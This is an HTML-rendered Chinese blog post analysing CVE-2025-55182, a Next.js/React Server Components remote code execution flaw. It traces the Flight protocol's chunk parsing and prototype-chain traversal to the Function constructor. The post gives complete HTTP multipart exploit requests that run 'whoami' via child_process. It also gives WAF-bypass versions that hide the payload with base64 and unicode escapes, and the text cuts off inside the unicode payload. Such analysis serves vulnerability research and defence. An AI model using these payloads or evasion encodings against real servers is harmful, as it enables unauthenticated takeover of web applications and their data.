class="params">name, value, _ref2</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> filename = _ref2.<span class="property">filename</span>,</span><br><span class="line">      mimeType = _ref2.<span class="property">mimeType</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;base64&quot;</span> === _ref2.<span class="property">encoding</span>.<span class="title function_">toLowerCase</span>())</span><br><span class="line">      <span class="keyword">throw</span> <span class="title class_">Error</span>(</span><br><span class="line">        <span class="string">&quot;React doesn&#x27;t accept base64 encoded file uploads because we don&#x27;t expect form data passed from a browser to ever encode data that way. If that&#x27;s the wrong assumption, we can easily fix it.&quot;</span></span><br><span class="line">      );</span><br><span class="line">    pendingFiles++;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">JSCompiler</span>_object_inline_chunks_238 = [];</span><br><span class="line">    value.<span class="title function_">on</span>(<span class="string">&quot;data&quot;</span>, <span class="keyword">function</span> (<span class="params">chunk</span>) &#123;</span><br><span class="line">      <span class="title class_">JSCompiler</span>_object_inline_chunks_238.<span class="title function_">push</span>(chunk);</span><br><span class="line">    &#125;);</span><br><span class="line">    value.<span class="title function_">on</span>(<span class="string">&quot;end&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> blob = <span class="keyword">new</span> <span class="title class_">Blob</span>(<span class="title class_">JSCompiler</span>_object_inline_chunks_238, &#123;</span><br><span class="line">        <span class="attr">type</span>: mimeType</span><br><span class="line">      &#125;);</span><br><span class="line">      response.<span class="property">_formData</span>.<span class="title function_">append</span>(name, blob, filename);</span><br><span class="line">      pendingFiles--;</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">0</span> === pendingFiles) &#123;</span><br><span class="line">        <span class="keyword">for</span> (blob = <span class="number">0</span>; blob &lt; queuedFields.<span class="property">length</span>; blob += <span class="number">2</span>)</span><br><span class="line">          <span class="title function_">resolveField</span>(</span><br><span class="line">            response,</span><br><span class="line">            queuedFields[blob],</span><br><span class="line">            queuedFields[blob + <span class="number">1</span>]</span><br><span class="line">          );</span><br><span class="line">        queuedFields.<span class="property">length</span> = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  busboyStream.<span class="title function_">on</span>(<span class="string">&quot;finish&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">close</span>(response);</span><br><span class="line">  &#125;);</span><br><span class="line">  busboyStream.<span class="title function_">on</span>(<span class="string">&quot;error&quot;</span>, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">    <span class="title function_">reportGlobalError</span>(response, err);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">getChunk</span>(response, <span class="number">0</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>我们将这个函数分成两部分来看：</p>
<ul>
<li>第一部分（Thread1）是从createResponse处到最后的getChunk之前。这部分是用busyboy这个解析库流式地解析用户的请求包，每解析出一个字段就会触发”field”事件，并执行<code>resolveField(response, name, value)</code>方法。这完全是一个异步的过程，它的工作就是不断地解析请求包，并依次构建Chunk。</li>
<li>第二部分（Thread2）是<code>return getChunk(response, 0);</code>，这部分返回了第0个Chunk，它在外面会被await触发第一次then函数，是整个解析过程的入口点。</li>
</ul>
<p>Chunk实际上是React解析multipart字段时的一个中间产物，我们看看它具体长什么样：</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/47.png" class="" title="image-20251215211146924">

<p>Thenable对象在await执行时，会执行它的then方法，直到其中的<code>resolve()</code>函数被执行才会返回。Chunk就是一个包含<code>status</code>、<code>value</code>、<code>reason</code>、<code>_response</code>几个属性，和一个<code>then</code>方法的Thenable对象。</p>
<p>与此同时，Chunk也是一个状态机，status保存状态，value和reason属性会根据status的值保存不同的东西，其整个生命周期的状态如下：</p>
<table>
<thead>
<tr>
<th align="left"><strong>状态</strong></th>
<th align="left"><strong>含义</strong></th>
<th align="left"><strong>value 存储</strong></th>
<th align="left"><strong>reason 存储</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left">PENDING</td>
<td align="left">等待服务器数据</td>
<td align="left">resolve 监听器数组</td>
<td align="left">reject 监听器数组</td>
</tr>
<tr>
<td align="left">RESOLVED_MODEL</td>
<td align="left">收到 JSON 字符串，待解析</td>
<td align="left">JSON 字符串</td>
<td align="left">chunk ID</td>
</tr>
<tr>
<td align="left">CYCLIC</td>
<td align="left">正在解析中（处理循环引用）</td>
<td align="left">resolve 监听器数组</td>
<td align="left">null</td>
</tr>
<tr>
<td align="left">BLOCKED</td>
<td align="left">解析完但依赖其他未完成的 chunk</td>
<td align="left">resolve 监听器数组</td>
<td align="left">reject 监听器数组</td>
</tr>
<tr>
<td align="left">fulfilled</td>
<td align="left">✅ 完全解析成功</td>
<td align="left">最终解析值 T</td>
<td align="left">null</td>
</tr>
<tr>
<td align="left">ERRORED</td>
<td align="left">❌ 解析失败</td>
<td align="left">null</td>
<td align="left">错误对象</td>
</tr>
</tbody></table>
<p>React在不断解析multipart中的每一个字段时会不断产生新的Chunk，这些Chunk中又可能有对于其他Chunk的引用（比如<code>[&quot;$1&quot;]</code>）（这里我们在<code>写在最开始处</code>有稍微提到一下），那么就会有两种可能性：</p>
<ul>
<li>Chunk1引用Chunk2时，保存2的multipart字段还没有被解析到，此时Chunk 2的状态是PENDING</li>
<li>Chunk1引用Chunk2时，保存2的multipart字段已经被解析了，此时Chunk 2的状态是fulfilled</li>
</ul>
<p>第一种情况，React会将Chunk#then中的resolve()和reject()分别保存在value和reason中，等到后面真正解析2的时候再次调用；</p>
<p>第二种情况，Chunk的value替换成字段的最终值，然后调用之前保存在value中的<code>resolve()</code>或<code>reject()</code>，结束异步过程。</p>
<p>接下来我们回过头看看之前的Thread2（也就是<code>return getChunk(response, 0);</code>），decodeReplyFromBusboy函数返回第0个Chunk的时候，此时Thread 1可能还没有开始解析multipart，此时这个Chunk的状态就是PENDING，这就是遇到的第一种情况。</p>
<p>整个解析流程就从Chunk 0的then()方法开始，到最后执行Chunk 0的<code>resolve()</code>结束。</p>
<p>前面提到了很多次“引用”，Chunk的相互引用也是Flight协议中的一个特点。</p>
<p>继续往下调试：</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/19.png" class="" title="image-20251214153152596">

<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/20.png" class="" title="image-20251214153203883">

<p>我们继续往下跟进，在 initializeModelChunk 函数中将依次对请求参数进行 json 格式化处理，并进入 reviveModel 函数进行反序列化递归处理：</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/21.png" class="" title="image-20251214153213829">

<p>进入到reviveModel函数中去</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/22.png" class="" title="image-20251214154251682">

<p>（这里我们先改回正常的poc，不然调试不到reviveModel函数）</p>
<p>重点关注被调用的 parseModelString 函数，对首字符为 $ 进行判断，并根据第二个字符取值的不同采取不同的方式进行处理</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/23.png" class="" title="image-20251214155047567">

<p>parseModelString 这个函数用来解析字符串，目的是扩展JSON原本不支持的数据类型。使用这一套规则几乎就可以模拟JavaScript中所有数据类型了：</p>
<p>这里说一下引用类型：</p>
<table>
<thead>
<tr>
<th align="left"><strong>编码格式</strong></th>
<th align="left"><strong>类型</strong></th>
<th align="left"><strong>示例</strong></th>
<th align="left"><strong>解析方式</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>$&lt;id&gt;</code></td>
<td align="left">Chunk 引用</td>
<td align="left">“$1”, “$a”</td>
<td align="left">getOutlinedModel(id) - 获取另一个 chunk 的值</td>
</tr>
<tr>
<td align="left"><code>$@&lt;id&gt;</code></td>
<td align="left">Promise</td>
<td align="left">“$@1”</td>
<td align="left">getChunk(id) - 返回 chunk 本身（类 Promise）</td>
</tr>
<tr>
<td align="left"><code>$F&lt;id&gt;</code></td>
<td align="left">Server Reference</td>
<td align="left">“$F1”</td>
<td align="left">loadServerReference() - 服务器函数引用</td>
</tr>
<tr>
<td align="left"><code>$T</code></td>
<td align="left">Temporary Reference</td>
<td align="left">“$T”</td>
<td align="left">createTemporaryReference() - 临时引用</td>
</tr>
<tr>
<td align="left"><code>$Q&lt;id&gt;</code></td>
<td align="left">Map</td>
<td align="left">“$Q1”</td>
<td align="left">getOutlinedModel(…, createMap)</td>
</tr>
<tr>
<td align="left"><code>$W&lt;id&gt;</code></td>
<td align="left">Set</td>
<td align="left">“$W1”</td>
<td align="left">getOutlinedModel(…, createSet)</td>
</tr>
<tr>
<td align="left"><code>$K&lt;id&gt;</code></td>
<td align="left">FormData</td>
<td align="left">“$K1”</td>
<td align="left">从 backing store 重建 FormData</td>
</tr>
<tr>
<td align="left"><code>$i&lt;id&gt;</code></td>
<td align="left">Iterator</td>
<td align="left">“$i1”</td>
<td align="left">getOutlinedModel(…, extractIterator)</td>
</tr>
</tbody></table>
<p>接下来就是关于本漏洞的重点之处了：原型链污染！</p>
<p>我们换一个poc来打：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /app HTTP/1.1</span><br><span class="line">Host: localhost:3000</span><br><span class="line">Next-Action: x</span><br><span class="line">X-Nextjs-Request-Id: b5dce965</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9</span><br><span class="line">Content-Length: 565</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;0&quot;</span><br><span class="line"></span><br><span class="line">[&quot;$1:a:b&quot;]</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;1&quot;</span><br><span class="line"></span><br><span class="line">&#123;&quot;a&quot;:&#123;&quot;b&quot;:&quot;foo&quot;&#125;&#125;</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br></pre></td></tr></table></figure>

<p>当解析 name 为 1 的 field 时，参数是一个正常的 Json 字符串，经过反序列化处理后将生成 Object 对象。重点跟踪 name 为 0 的解析过程，经过 reviveModel迭代后， value 将从 Array 对象变成 <code>$1:a:b</code> 字符串，然后进入 parseModelString 函数进行处理</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/24.png" class="" title="image-20251214161547405">

<p>在 parseModelString 中，判断 value 是否以 $ 开头，并根据第二个字符的取值选择不同的处理方式，对于上述请求，将去掉首字符 $ ，然后调用getOutlinedModel函数。</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/25.png" class="" title="image-20251214165954756">

<p>然后我们跟进一下getOutlinedModel函数。将传入的 reference （对应 value ）利用 : 进行分割，并尝试从生成的数组中提取第一个元素转换为整数赋值给 id </p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/26.png" class="" title="image-20251214170212126">

<p>此时的reference其实就是<code>1:a:b</code>。</p>
<p>然后根据id提取对应的chunk对象，并根据<code>id.status</code>来选择处理方式。这里 id&#x3D;1 ，因此将尝试获取 name&#x3D;”1” 模块生成的 Object 对象（涉及到 Promise 异步处理等，调试过程从略），直到 status 变为 fulfilled （加载完毕），遍历之前分割生成的数组，迭代获取 parentObject 对象。这里会进行两次JSON.parse。</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/27.png" class="" title="image-20251214170602553">

<p>下面发生在第二次json.parse之后，为<code>chunk.status</code>赋值fulfilled ，也就是加载完毕</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/28.png" class="" title="image-20251214173845627">

<p>然后就会进入下面的原型链污染部分</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/29.png" class="" title="image-20251214195058987">

<p>最后获取值<code>foo</code></p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/30.png" class="" title="image-20251214171708400">

<p>最终返回value为<code>foo</code>，变化过程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$1:a:b</span><br><span class="line">-&gt; &#123;&quot;a&quot;:&#123;&quot;b&quot;:&quot;foo&quot;&#125;&#125;.a.b</span><br><span class="line">-&gt; foo</span><br></pre></td></tr></table></figure>

<p>这里传入的参数来自于用户请求可控，因此如果传入类似 proto ，那么就可能出现原型链污染。比如将请求变为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /app HTTP/1.1</span><br><span class="line">Host: localhost:3000</span><br><span class="line">Next-Action: x</span><br><span class="line">X-Nextjs-Request-Id: b5dce965</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9</span><br><span class="line">Content-Length: 565</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;1&quot;</span><br><span class="line"></span><br><span class="line">[]</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;0&quot;</span><br><span class="line"></span><br><span class="line">&#123;&quot;a&quot;:&quot;$1:__proto__:constructor&quot;&#125;</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br></pre></td></tr></table></figure>

<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/31.png" class="" title="image-20251214173612484">

<p>最终将获取 Array 类型的构造函数对象</p>
<p>接下来我们再加一个 constructor</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /app HTTP/1.1</span><br><span class="line">Host: localhost:3000</span><br><span class="line">Next-Action: x</span><br><span class="line">X-Nextjs-Request-Id: b5dce965</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9</span><br><span class="line">Content-Length: 565</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;1&quot;</span><br><span class="line"></span><br><span class="line">[]</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;0&quot;</span><br><span class="line"></span><br><span class="line">&#123;&quot;a&quot;:&quot;$1:__proto__:constructor:constructor&quot;&#125;</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br></pre></td></tr></table></figure>

<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/32.png" class="" title="image-20251214173931424">

<p>成功获取了function！这样，后面的rce就有了可能。</p>
<p>变化过程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$1:__proto__:constructor:constructor</span><br><span class="line">-&gt; []:__proto__:constructor:constructor</span><br><span class="line">-&gt; Array:constructor:constructor</span><br><span class="line">-&gt; Array#constructor:constructor</span><br><span class="line">-&gt; new Function</span><br></pre></td></tr></table></figure>



<p>除了 getOutlinedModel 这个 Sink 点外，调试发现还有其他的多个潜在 Sink 点，比如 createModelResolver 函数等，实际触发哪个 Sink 取决于请求的格式 ：</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/33.png" class="" title="image-20251214174104755">





<h2 id="漏洞触发流程"><a href="#漏洞触发流程" class="headerlink" title="漏洞触发流程"></a>漏洞触发流程</h2><p>在此之前我们先观察一下parseModelString函数</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/48.png" class="" title="image-20251214194437469">

<p>我们看<code>case @</code>那段，假若是<code>$@0</code>，那么就是将前面两位去掉，再获取chunk对象，也就是chunk对象本身。</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/34.png" class="" title="image-20251214194906366">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /app HTTP/1.1</span><br><span class="line">Host: localhost:3000</span><br><span class="line">Next-Action: x</span><br><span class="line">X-Nextjs-Request-Id: b5dce965</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9</span><br><span class="line">Content-Length: 565</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;1&quot;</span><br><span class="line"></span><br><span class="line">&quot;$@0&quot;</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;0&quot;</span><br><span class="line"></span><br><span class="line">&#123;&quot;a&quot;:&quot;$1:__proto__:constructor:constructor&quot;&#125;</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br></pre></td></tr></table></figure>

<p>这样就成功获取到了chunk对象</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/35.png" class="" title="image-20251214195658303">

<p>流程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$1:__proto__:constructor:constructor</span><br><span class="line">-&gt; chunk对象:__proto__:constructor:constructor</span><br><span class="line">-&gt; Promise:constructor:constructor</span><br><span class="line">-&gt; Promise#constructor:constructor</span><br><span class="line">-&gt; new Function</span><br></pre></td></tr></table></figure>



<p>然后我们观察到如下代码：</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/36.png" class="" title="image-20251214195557190">

<p>将会触发 response._formData.get 调用，如果可以污染 get ，那么就可能实现 RCE。</p>
<p>接下来我们对应POC看看。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /app HTTP/1.1</span><br><span class="line">Host: localhost:3000</span><br><span class="line">Next-Action: x</span><br><span class="line">X-Nextjs-Request-Id: b5dce965</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9</span><br><span class="line">Content-Length: 565</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;0&quot;</span><br><span class="line"></span><br><span class="line">&#123;&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;reason&quot;:-1,&quot;value&quot;:&quot;&#123;\&quot;then\&quot;:\&quot;$B1337\&quot;&#125;&quot;,&quot;_response&quot;:&#123;&quot;_prefix&quot;:&quot;var res=process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString().trim();;throw Object.assign(new Error(&#x27;NEXT_REDIRECT&#x27;),&#123;digest: `NEXT_REDIRECT;push;/login?a=$&#123;res&#125;;307;`&#125;);&quot;,&quot;_chunks&quot;:&quot;$Q2&quot;,&quot;_formData&quot;:&#123;&quot;get&quot;:&quot;$1:constructor:constructor&quot;&#125;&#125;&#125;</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;1&quot;</span><br><span class="line"></span><br><span class="line">&quot;$@0&quot;</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;2&quot;</span><br><span class="line"></span><br><span class="line">[]</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad--</span><br></pre></td></tr></table></figure>

<p>看看<code>$@0</code>这部分，获取chunk对象</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/37.png" class="" title="image-20251214200711562">

<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/38.png" class="" title="image-20251214200638674">

<p>继续跟着调试，最后相当于创建了一个匿名函数来进行RCE。</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/39.png" class="" title="image-20251214201202757">





<h2 id="一些WAF"><a href="#一些WAF" class="headerlink" title="一些WAF"></a>一些WAF</h2><h3 id="base64-bypass"><a href="#base64-bypass" class="headerlink" title="base64 bypass"></a>base64 bypass</h3><p>我们可以通过base64编码来进行一些简单的绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /app HTTP/1.1</span><br><span class="line">Host: localhost:3000</span><br><span class="line">Next-Action: x</span><br><span class="line">X-Nextjs-Request-Id: b5dce965</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9</span><br><span class="line">Content-Length: 565</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;0&quot;</span><br><span class="line"></span><br><span class="line">&#123;&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;reason&quot;:-1,&quot;value&quot;:&quot;&#123;\&quot;then\&quot;:\&quot;$B\&quot;&#125;&quot;,&quot;_response&quot;:&#123;&quot;_prefix&quot;:&quot;eval(Buffer.from(&#x27;dmFyIHJlcz1wcm9jZXNzLm1haW5Nb2R1bGUucmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCd3aG9hbWknKS50b1N0cmluZygpLnRyaW0oKTs7dGhyb3cgT2JqZWN0LmFzc2lnbihuZXcgRXJyb3IoJ05FWFRfUkVESVJFQ1QnKSx7ZGlnZXN0OiBgTkVYVF9SRURJUkVDVDtwdXNoOy9sb2dpbj9hPSR7cmVzfTszMDc7YH0pOw==&#x27;,&#x27;base64&#x27;).toString());&quot;,&quot;_chunks&quot;:&quot;$Q2&quot;,&quot;_formData&quot;:&#123;&quot;get&quot;:&quot;$1:constructor:constructor&quot;&#125;&#125;&#125;</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;1&quot;</span><br><span class="line"></span><br><span class="line">&quot;$@0&quot;</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;2&quot;</span><br><span class="line"></span><br><span class="line">[]</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad--</span><br></pre></td></tr></table></figure>

<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/49.png" class="" title="image-20251214202308802">

<p>但是这种bypass没有什么本质变化</p>
<h3 id="unicode-bypass"><a href="#unicode-bypass" class="headerlink" title="unicode bypass"></a>unicode bypass</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /app HTTP/1.1</span><br><span class="line">Host: localhost:3000</span><br><span class="line">Next-Action: x</span><br><span class="line">X-Nextjs-Request-Id: b5dce965</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9</span><br><span class="line">Content-Length: 565</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;0&quot;</span><br><span class="line"></span><br><span class="line">&#123;&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;reason&quot;:-1,&quot;value&quot;:&quot;&#123;\&quot;then\&quot;:\&quot;$B1337\&quot;&#125;&quot;,&quot;\u005F\u0072\u0065\u0073\u0070\u006F\u006E\u0073\u0065&quot;:&#123;&quot;\u005F\u0070\u0072\u0065\u0066\u0069\u0078&quot;:&quot;\u0076\u0061\u0072\u0020\u0072\u0065\u0073\u003D\u0070\u0072\u006F\u0063\u0065\u0073\u0073\u002E\u006D\u0061\u0069\u006E\u004D\u006F\u0064\u0075\u006C\u0065\u002E\u0072\u0065\u0071\u0075\u0069\u0072\u0065\u0028\u0027\u0063\u0068\u0069\u006C\u0064\u005F\u0070\u0072\u006F\u0063\u0065\u0073\u0073\u0027\u0029\u002E\u0065\u0078\u0065\u0063\u0053\u0079\u006E\u0063\u0028\u0027\u0077\u0068\u006F\u0061\u006D\u0069\u0027\u0029\u002E\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067\u0028\u0029\u002E\u0074\u0072\u0069\u006D\u0028\u0029\u003B\u003B\u0074\u0068\u0072\u006F\u0077\u0020\u004F\u0062\u006A\u0065\u0063\u0074\u002E\u0061\u0073\u0073\u0069\u0067\u006E\u0028\u006E\u0065\u0077\u0020\u0045\u0072\u0072\u006F\u0072\u0028\u0027\u004E\u0045\u0058\u0054\u005F\u0052\u0045\u0044\u0049\